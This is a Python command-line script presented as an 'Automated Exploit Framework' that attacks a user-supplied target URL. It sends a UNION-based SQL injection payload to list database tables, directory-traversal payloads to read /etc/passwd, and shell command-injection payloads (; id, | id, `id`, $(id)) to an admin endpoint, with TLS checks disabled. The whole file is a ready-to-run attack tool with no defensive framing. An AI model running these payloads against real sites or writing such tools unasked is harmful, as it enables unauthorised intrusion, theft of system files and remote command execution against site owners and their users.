#!/usr/bin/env python3
"""
Automated Exploit Framework
Identifies and exploits common vulnerabilities
Author: Wan Mohamad Hanis bin Wan Hassan
"""

import requests
import re
from typing import List, Dict
import sys

class AutoExploit:
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.vulnerabilities = []
    
    def exploit_sqli(self, param: str) -> bool:
        """Exploit SQL injection vulnerability"""
        # UNION-based SQLi payload
        payload = f"' UNION SELECT table_name,NULL FROM information_schema.tables--"
        
        try:
            response = self.session.get(
                self.target_url,
                params={param: payload},
                timeout=10
            )
            
            if response.status_code == 200:
                # Check for table names in response
                if 'users' in response.text.lower() or 'admin' in response.text.lower():
                    print(f"[+] SQLi exploitation successful on parameter: {param}")
                    return True
        except:
            pass
        
        return False
    
    def exploit_lfi(self, param: str) -> str:
        """Exploit Local File Inclusion"""
        payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={param: payload},
                    timeout=10
                )
                
                if 'root:x:0:0:' in response.text:
                    print(f"[+] LFI exploitation successful")
                    print(f"[+] Retrieved /etc/passwd")
                    return response.text
            except:
                pass
        
        return ""
    
    def attempt_rce(self, endpoint: str) -> bool:
        """Attempt Remote Code Execution"""
        payloads = [
            "; id",
            "| id", 
            "`id`",
            "$(id)"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url + endpoint,
                    params={'cmd': payload},
                    timeout=10
                )
                
                if 'uid=' in response.text and 'gid=' in response.text:
                    print(f"[+] RCE exploitation successful!")
                    print(f"[+] Command injection payload: {payload}")
                    return True
            except:
                pass
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    
    exploiter = AutoExploit(sys.argv[1])
    print("[*] Attempting automated exploitation...")
    exploiter.exploit_sqli('id')
    exploiter.exploit_lfi('file')
    exploiter.attempt_rce('/admin/exec')
